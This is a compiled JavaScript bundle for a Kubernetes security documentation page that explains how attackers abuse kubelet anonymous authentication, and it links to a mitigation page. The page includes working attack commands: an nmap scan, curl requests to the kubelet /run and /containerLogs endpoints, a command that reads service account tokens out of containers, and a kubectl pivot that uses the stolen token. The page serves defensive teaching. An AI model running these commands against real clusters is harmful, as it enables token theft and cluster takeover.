"use strict";(globalThis.webpackChunkk_8_s_security=globalThis.webpackChunkk_8_s_security||[]).push([[636],{150(e,t,n){n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>u});const s=JSON.parse('{"id":"attack-vectors/kubelet-anonymous-auth","title":"Kubelet Anonymous Authentication Abuse","description":"How attackers exploit kubelet anonymous authentication to execute commands, read pod logs, and access sensitive data on Kubernetes nodes.","source":"@site/docs/attack-vectors/kubelet-anonymous-auth.md","sourceDirName":"attack-vectors","slug":"/attack-vectors/kubelet-anonymous-auth","permalink":"/kubernetes-security/attack-vectors/kubelet-anonymous-auth","draft":false,"unlisted":false,"editUrl":"https://github.com/geek-kb/k8s_security/edit/main/docs/attack-vectors/kubelet-anonymous-auth.md","tags":[{"inline":true,"label":"attack-vector","permalink":"/kubernetes-security/tags/attack-vector"},{"inline":true,"label":"kubelet","permalink":"/kubernetes-security/tags/kubelet"},{"inline":true,"label":"node-security","permalink":"/kubernetes-security/tags/node-security"},{"inline":true,"label":"CKS","permalink":"/kubernetes-security/tags/cks"}],"version":"current","lastUpdatedBy":"Itai Ganot","lastUpdatedAt":1771236448000,"sidebarPosition":22,"frontMatter":{"sidebar_position":22,"title":"Kubelet Anonymous Authentication Abuse","description":"How attackers exploit kubelet anonymous authentication to execute commands, read pod logs, and access sensitive data on Kubernetes nodes.","keywords":["kubernetes security","kubelet anonymous authentication","kubelet API","kubelet exploit","node compromise","kubernetes node security","CIS benchmark","kubelet unauthenticated","CKS"],"tags":["attack-vector","kubelet","node-security","CKS"],"related":["/kubernetes-security/best-practices/cluster-setup-and-hardening/node-security/kubelet-authentication/","/kubernetes-security/attack-vectors/exposed-kubelet-api/","/kubernetes-security/best-practices/cluster-setup-and-hardening/cis/cis-benchmark-for-k8s/"]},"sidebar":"default","previous":{"title":"Cloud Metadata Service Abuse","permalink":"/kubernetes-security/attack-vectors/cloud-metadata-service-abuse"},"next":{"title":"Ephemeral Debug Container Abuse","permalink":"/kubernetes-security/attack-vectors/ephemeral-container-abuse"}}');var i=n(4848),r=n(8453);const a={sidebar_position:22,title:"Kubelet Anonymous Authentication Abuse",description:"How attackers exploit kubelet anonymous authentication to execute commands, read pod logs, and access sensitive data on Kubernetes nodes.",keywords:["kubernetes security","kubelet anonymous authentication","kubelet API","kubelet exploit","node compromise","kubernetes node security","CIS benchmark","kubelet unauthenticated","CKS"],tags:["attack-vector","kubelet","node-security","CKS"],related:["/kubernetes-security/best-practices/cluster-setup-and-hardening/node-security/kubelet-authentication/","/kubernetes-security/attack-vectors/exposed-kubelet-api/","/kubernetes-security/best-practices/cluster-setup-and-hardening/cis/cis-benchmark-for-k8s/"]},o="Kubelet Anonymous Authentication Abuse",c={},u=[{value:"Exploitation Steps",id:"exploitation-steps",level:2},{value:"1. Discover Kubelet Endpoints",id:"1-discover-kubelet-endpoints",level:3},{value:"2. List Running Pods on the Node",id:"2-list-running-pods-on-the-node",level:3},{value:"3. Execute Commands Inside Containers",id:"3-execute-commands-inside-containers",level:3},{value:"4. Retrieve Container Logs",id:"4-retrieve-container-logs",level:3},{value:"5. Pivot to Cluster-Wide Access",id:"5-pivot-to-cluster-wide-access",level:3},{value:"Result",id:"result",level:3},{value:"Mitigation",id:"mitigation",level:2},{value:"References",id:"references",level:2}];function l(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(t.header,{children:(0,i.jsx)(t.h1,{id:"kubelet-anonymous-authentication-abuse",children:"Kubelet Anonymous Authentication Abuse"})}),"\n",(0,i.jsxs)(t.p,{children:["The ",(0,i.jsx)(t.strong,{children:"kubelet"})," is the primary node agent running on each Kubernetes node, responsible for managing pods and containers. By default in some configurations, the kubelet API allows ",(0,i.jsx)(t.strong,{children:"anonymous authentication"}),", meaning any network request to port 10250 can access the kubelet without credentials."]}),"\n",(0,i.jsxs)(t.p,{children:["When anonymous authentication is enabled, attackers who gain network access to a node can ",(0,i.jsx)(t.strong,{children:"list pods, execute commands inside containers, retrieve logs, and access sensitive data"})," without any authentication."]}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"exploitation-steps",children:"Exploitation Steps"}),"\n",(0,i.jsx)(t.p,{children:"An attacker with network access to the kubelet port (typically 10250) exploits the anonymous authentication misconfiguration."}),"\n",(0,i.jsx)(t.h3,{id:"1-discover-kubelet-endpoints",children:"1. Discover Kubelet Endpoints"}),"\n",(0,i.jsx)(t.p,{children:"The attacker scans for accessible kubelet APIs on the network:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"nmap -p 10250 -sV 10.0.0.0/24\n"})}),"\n",(0,i.jsx)(t.p,{children:"Alternatively, from inside a compromised pod:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"curl -sk https://${NODE_IP}:10250/pods\n"})}),"\n",(0,i.jsx)(t.p,{children:"If the response returns pod information without requiring authentication, anonymous access is enabled."}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h3,{id:"2-list-running-pods-on-the-node",children:"2. List Running Pods on the Node"}),"\n",(0,i.jsx)(t.p,{children:"The attacker queries the kubelet to enumerate all pods running on the node:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"curl -sk https://10.0.0.5:10250/pods | jq '.items[].metadata | {name, namespace}'\n"})}),"\n",(0,i.jsx)(t.p,{children:"This reveals pod names, namespaces, and container information."}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h3,{id:"3-execute-commands-inside-containers",children:"3. Execute Commands Inside Containers"}),"\n",(0,i.jsxs)(t.p,{children:["Using the kubelet's ",(0,i.jsx)(t.code,{children:"/run"})," endpoint, the attacker executes arbitrary commands inside any container on the node:"]}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:'curl -sk https://10.0.0.5:10250/run/kube-system/kube-proxy-abc123/kube-proxy \\\n  -X POST \\\n  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"\n'})}),"\n",(0,i.jsx)(t.p,{children:"This retrieves the service account token from the targeted container."}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h3,{id:"4-retrieve-container-logs",children:"4. Retrieve Container Logs"}),"\n",(0,i.jsx)(t.p,{children:"The attacker reads container logs to extract sensitive information:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:"curl -sk https://10.0.0.5:10250/containerLogs/production/api-server-pod/api-container\n"})}),"\n",(0,i.jsx)(t.p,{children:"Logs may contain credentials, API keys, database connection strings, or other secrets."}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h3,{id:"5-pivot-to-cluster-wide-access",children:"5. Pivot to Cluster-Wide Access"}),"\n",(0,i.jsx)(t.p,{children:"Using stolen service account tokens, the attacker authenticates to the Kubernetes API server:"}),"\n",(0,i.jsx)(t.pre,{children:(0,i.jsx)(t.code,{className:"language-bash",children:'export TOKEN=$(curl -sk https://10.0.0.5:10250/run/kube-system/coredns-abc123/coredns \\\n  -X POST -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token")\n\nkubectl --token=$TOKEN --server=https://kubernetes.default.svc auth can-i --list\n'})}),"\n",(0,i.jsx)(t.p,{children:"If the compromised service account has elevated privileges, the attacker gains cluster-wide access."}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h3,{id:"result",children:"Result"}),"\n",(0,i.jsx)(t.p,{children:"The attacker achieves:"}),"\n",(0,i.jsxs)(t.ul,{children:["\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.strong,{children:"Pod enumeration"})," across all namespaces on the node"]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.strong,{children:"Arbitrary command execution"})," inside any container"]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.strong,{children:"Service account token theft"})," for privilege escalation"]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.strong,{children:"Log access"})," potentially containing sensitive data"]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.strong,{children:"Lateral movement"})," to other nodes and the control plane"]}),"\n"]}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"mitigation",children:"Mitigation"}),"\n",(0,i.jsxs)(t.p,{children:["\u27a1 ",(0,i.jsx)(t.a,{href:"/kubernetes-security/best-practices/cluster-setup-and-hardening/node-security/kubelet-authentication/",children:"Securing Kubelet Authentication"})]}),"\n",(0,i.jsx)(t.hr,{}),"\n",(0,i.jsx)(t.h2,{id:"references",children:"References"}),"\n",(0,i.jsx)(t.p,{children:"This article is based on information from the following official sources:"}),"\n",(0,i.jsxs)(t.ol,{children:["\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.a,{href:"https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/",children:"Kubelet Authentication/Authorization"})," - Kubernetes Documentation"]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.a,{href:"https://www.cisecurity.org/benchmark/kubernetes",children:"CIS Kubernetes Benchmark - Kubelet"})," - Center for Internet Security"]}),"\n",(0,i.jsxs)(t.li,{children:[(0,i.jsx)(t.a,{href:"https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/",children:"Securing a Cluster"})," - Kubernetes Documentation"]}),"\n"]})]})}function d(e={}){const{wrapper:t}={...(0,r.R)(),...e.components};return t?(0,i.jsx)(t,{...e,children:(0,i.jsx)(l,{...e})}):l(e)}},8453(e,t,n){n.d(t,{R:()=>a,x:()=>o});var s=n(6540);const i={},r=s.createContext(i);function a(e){const t=s.useContext(r);return s.useMemo(function(){return"function"==typeof e?e(t):{...t,...e}},[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(r.Provider,{value:t},e.children)}}}]);